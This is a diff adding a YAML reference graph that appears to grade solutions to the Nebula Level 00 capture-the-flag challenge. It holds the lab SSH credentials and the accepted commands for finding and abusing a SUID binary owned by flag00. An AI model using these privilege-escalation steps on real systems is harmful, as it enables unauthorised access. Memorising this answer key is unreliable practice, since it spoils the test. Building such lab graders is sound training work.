@@ -1,0 +1,119 @@
+version: "0.5"
+
+graph:
+  type: "reference"
+
+challenge:
+  id: "nebula_level00"
+  name: "Nebula Level 00"
+  description: >
+    Find a SUID executable owned by user flag00 and use it to execute
+    getflag as flag00.
+
+attacker_context:
+  user: "level00"
+  access:
+    method: "ssh"
+    credentials:
+      username: "level00"
+      password: "level00"
+  target:
+    host: "<target-hostname-or-ip>"
+    port: 22
+
+goal:
+  node: "node1"
+
+irrelevant_commands:
+  - "man"
+  - "pwd"
+  - "id"
+  - "whoami"
+  - "clear"
+  - "history"
+  - "uname"
+  - "hostname"
+
+nodes:
+  - id: "start"
+    type: "sentinel"
+    label: "Start"
+
+  - id: "node_ls_bin"
+    type: "state"
+    label: "/bin inspected"
+
+  - id: "node_ls_candidate_dir"
+    type: "state"
+    label: "Candidate directory inspected"
+
+  - id: "node0"
+    type: "state"
+    label: "SUID binary found"
+
+  - id: "node1"
+    type: "state"
+    label: "Execution as flag00 obtained"
+
+edges:
+  - id: "edge0"
+    from: "start"
+    to: "node0"
+    action: "discover_flag00_suid_binary_with_find"
+    accepted_commands:
+      - "find / -type f -executable -perm -4000 -user flag00 2>/dev/null"
+      - "find / -type f -perm -4000 -user flag00 2>/dev/null"
+      - "find / -perm -4000 -type f 2>/dev/null"
+    accepted_command_regex:
+      - "^find / -type f -executable -perm -4000 -user flag00 2>\\s*/dev/null\\s*\\|\\s*head(\\s+.*)?$"
+      - "^find / -type f -perm -4000 -user flag00 2>\\s*/dev/null\\s*\\|\\s*head(\\s+.*)?$"
+      - "^find / -perm -4000 -type f 2>\\s*/dev/null\\s*\\|\\s*head(\\s+.*)?$"
+    transition_match:
+      exit_code: 0
+      stdout_regex: ".*/flag00\\n?"
+      stderr_regex: "^$"
+
+  - id: "edge1"
+    from: "node0"
+    to: "node1"
+    action: "execute_getflag_via_flag00_suid_binary"
+    accepted_commands:
+      - "echo /bin/getflag | /bin/.../flag00"
+      - "echo getflag | /bin/.../flag00"
+    transition_match:
+      exit_code: 0
+      stdout_regex: ".*"
+      stderr_regex: "^$"
+
+  - id: "edge2"
+    from: "start"
+    to: "node_ls_bin"
+    action: "inspect_bin_directory"
+    accepted_commands:
+      - "ls -al /bin"
+    transition_match:
+      exit_code: 0
+      stdout_regex: ".*"
+      stderr_regex: "^$"
+
+  - id: "edge3"
+    from: "node_ls_bin"
+    to: "node_ls_candidate_dir"
+    action: "inspect_candidate_directory"
+    accepted_commands:
+      - "ls -al /bin/..."
+    transition_match:
+      exit_code: 0
+      stdout_regex: ".*"
+      stderr_regex: "^$"
+
+  - id: "edge4"
+    from: "node_ls_candidate_dir"
+    to: "node0"
+    action: "inspect_flag00_binary_and_identify_suid"
+    accepted_commands:
+      - "ls -al /bin/.../flag00"
+    transition_match:
+      exit_code: 0
+      stdout_regex: ".*flag00.*"
+      stderr_regex: "^$"
